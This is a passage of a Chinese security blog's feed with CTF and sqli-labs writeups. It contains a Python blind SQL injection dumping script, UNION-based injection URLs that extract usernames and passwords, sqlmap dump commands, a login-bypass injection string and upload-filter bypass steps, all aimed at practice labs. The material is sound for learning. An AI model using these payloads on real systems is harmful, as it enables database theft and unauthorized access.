j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if &quot;You are in&quot; in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint(&#39;表名：&#39;,table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&#39;&#39;&#39; % (        j, i)        r = requests.get(url + db_payload)        if &quot;You are in&quot; in r.text:            column_num = j            print((&quot;[+] 表名：%-10s\t&quot; % i) + str(column_num) + &#39;字段&#39;)            break#### 猜解列名长度 ####column_num = 3print(&#39;%s表中的列名：&#39; % table_list[-1])for j in range(3):    column_name = &#39;&#39;    for k in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if &quot;You are in&quot; not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if &quot;You are in&quot; in r.text:                column_name += chr(l)    print(&#39;[+] &#39;,column_name)    column_list.append(column_name)print(&#39;开始爆破以下字段：&#39;,column_list[1:])for column in column_list[1:]:    print(column,&#39;：&#39;)    dump_num = 0    for i in range(30):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(%s) from %s.%s)--+&#39;&#39;&#39; % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = &#39;&#39;        #### 字段长度 ####        for j in range(1, 21):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if &quot;You are in&quot; not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if &quot;You are in&quot; in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print(&#39;[+]&#39;,dump_name)</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs5-6-盲注&quot;&gt;&lt;a href=&quot;#sqli-labs5-6-盲注&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs5-6(盲注)&quot;&gt;&lt;/a&gt;sqli-labs5-6(盲注)&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;盲注分
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs  1-4</title>
    <link href="http://0xmj.club/2018/04/02/Sqli-labs-1-4/"/>
    <id>http://0xmj.club/2018/04/02/Sqli-labs-1-4/</id>
    <published>2018-04-02T08:13:07.000Z</published>
    <updated>2018-04-02T08:14:29.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs-1-4"><a href="#Sqli-labs-1-4" class="headerlink" title="Sqli-labs  1-4"></a>Sqli-labs  1-4</h1><p>[toc]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p><p>##安装<br>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170021_645.png" alt=""></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1</p><p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1</p><p>最外层的单引号是标识错误的，将其隔离</p><pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p><pre><code>select uername,password from talble where id = &#39;input&#39;-----&gt;select uername,password from talble where id = &#39;input 攻击代码&#39;</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170025_607.png" alt=""></p><blockquote><p>使用union语句查询时，必须使前面的语句查询出错(例如id=-1，而id中并没有为-1的)，以为当查询出错时，sql语句结果为空，也就会显示我们构造的sql语句所查询的内容，即union之后语句的执行结果。</p></blockquote><p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170038_567.png" alt=""></p><p>6.暴列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.<strong>columns</strong> where <strong>table_name</strong>=’users’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170043_887.png" alt=""></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p><pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层单引号：</p><pre><code>near &#39;     &#39; LIMIT 0,1     &#39; at line 1</code></pre><p>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：</p><pre><code>select username,password from table where id = input</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170110_138.png" alt=""></p><h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170121_987.png" alt=""></p><pre><code>MySQL server version for the right syntax to use near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>现将外层单引号去掉</p><pre><code>near &#39;              &#39;  1\  &#39;) LIMIT 0,1           &#39; at line 1</code></pre><p> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )</p><p>所以修改sql语句：</p><p>select username，password from table where id = (‘input’)</p><p>所以再用这样的代码来进行注入：</p><pre><code>?id=1′) –-+</code></pre><p>1’) and (‘1’=’1<br>放入sql语句中：</p><p>select username，password from table where id = (‘  1’) and (‘1’=’1  ‘)</p><p>2.确定字段个数</p><p>3.判断回显位(2,3处为显示位)</p><p>4.爆数据库名字、连接账号信息</p><p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p><h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near ‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p><pre><code>near &#39;&quot;3\&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层的单引号，那是用来标识错误信息的</p><pre><code>near &#39;           &quot;  3\  &quot;) LIMIT 0,1             &#39; at line 1</code></pre><p>其中 3\ 是手动输入的，还剩下””)</p><p>说明sql语句中应该有 (“”)   （ 括号也配对）</p><p>再次猜测sql语句：</p><pre><code>select * username,password from table where id = (&quot;input&quot;)</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170145_156.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs-1-4&quot;&gt;&lt;a href=&quot;#Sqli-labs-1-4&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs  1-4&quot;&gt;&lt;/a&gt;Sqli-labs  1-4&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web—writeup</title>
    <link href="http://0xmj.club/2018/04/02/%E5%AE%9E%E9%AA%8C%E5%90%A7web%E2%80%94writeup/"/>
    <id>http://0xmj.club/2018/04/02/实验吧web—writeup/</id>
    <published>2018-04-02T08:10:18.000Z</published>
    <updated>2018-04-02T08:11:11.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_235.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_176.png" alt=""></p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="http://oy0tigw51.bkt.clouddn.com/201803181643_54.png" alt=""></p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p><p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p><p>回显</p><p>available databases [2]:<br>[<em>] information_schema<br>[</em>] test<br>注表名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” –tables –level 5<br>回显</p><p>Database: test<br>[1 table]<br>+——-+<br>| admin |<br>+——-+<br>注字段名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” –columns –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[2 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| password | varchar(100) |<br>| username | varchar(100) |<br>+———-+————–+<br>直接注密码内容</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” -C “password” –dump –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p><p>账号 admin 密码 idnuenna<br>获得key</p><p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181759_121.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181800_592.png" alt=""></p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p><ol><li>安装 .NET 9.9</li><li>使用IE浏览器访问</li><li>要在英国<br>根据提示和题目名称呢，可以判断要修改http头</li></ol><p>于是乎构造</p><p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803181805_551.png" alt=""></p><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_242.png" alt=""></p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p><p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p><p>我们看到爆出了三个库：information_schema、my_db、test</p><p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p><p>在my_db库里面爆出了两个表：news、thiskey<br>对了，thiskey在这里，然后就尝试爆列名</p><p>id=1 union select 1,column_name from information_schema.columns where table_schema=’my_db’</p><p>应该就是k0y了，试试看</p><p>id=1 union select 1,k0y from thiskey</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><pre><code>&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) {  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website?</code></pre><p>要将hackerDJ进行两次url编码才可满足两个条件</p><p>hackerDJ</p><p>%68%61%63%6B%65%72%44%4A</p><p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181831_78.png" alt=""></p><p>flag: DUTCTF{PHP_is_the_best_program_language}</p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181833_337.png" alt=""></p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理//如果二者的值都不为空if($_POST[user] &amp;&amp; $_POST[pass]) {    //连接数据库    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);    //选择数据库，如果出错，打印错误信息并终止代码运行    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) {        die(&quot;Connection failed: &quot; . mysql_error($conn));} //将用户输入的user值存储到user变量$user = $_POST[user];//将用户输入的pass值，使用md5 hash后，存入pass变量$pass = md5($_POST[pass]);//从表php中查找pw的值//后半句的意思是：只保留user值为$user那一行的查找结果 $sql = &quot;select pw from php where user=&#39;$user&#39;&quot;;//查询语句的运行结果存入变量query之中$query = mysql_query($sql);//如果找不到，报错并终止if (!$query) {    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();}//提取出query的值并以MYSQL_ASSOC格式存放在row之中$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];//如果row[pw]的值存在，且pass的值与row[pw]相同，则返回key//strcasecmp是比较两个值大小，返回：-1,0,1  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}//否则返回登录失败else {    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  }}</code></pre><p>这里pass的值是 用户提交的密码经过MD5hash之后的值 如果二者相同则拿到 key</p><p>找输入输出</p><p>user一项的输出在php代码中如下： $sql = “select pw from php where user=’$user’”; 看起来并未对输入进行过滤，我们试着打入引号，果然报错，证明注入点可用！</p><p>分析</p><p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p><p>构造</p><p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p><p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="http://oy0tigw51.bkt.clouddn.com/201803192336_939.png" alt=""></p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803192339_352.png" alt=""></p><p>方法一：</p><pre><code>&lt;?php      $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;      $_code = str_rot13($_code);      $_code = strrev($_code);      $_code = base64_decode($_code);      //echo $_code;      $_ans = &quot;&quot;;      for($x = 0; $x &lt; strlen($_code); $x++) {          $t = substr($_code, $x, 1);          $t1 = ord($t) - 1;          $t = chr($t1);          $_ans = $_ans . $t;      }      $_ans = strrev($_ans);      echo $_ans;  ?&gt;</code></pre><p>方法二：</p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_out=&#39;&#39;;$_in= base64_decode (strrev(str_rot13 ($str)));        for($_start=0;$_start&lt;strlen($_in);$_start++){                $_c=substr($_in,$_start,1);                $__=ord($_c)-1;                $_c=chr($__);                $_out=$_out.$_c;        }    echo strrev($_out);?&gt;</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200104_758.png" alt=""></p><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p><pre><code>&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。<br>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，<br>这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。当我们传入name[]=1&amp;password[]=2时，会造成<code>sha1(Array) === 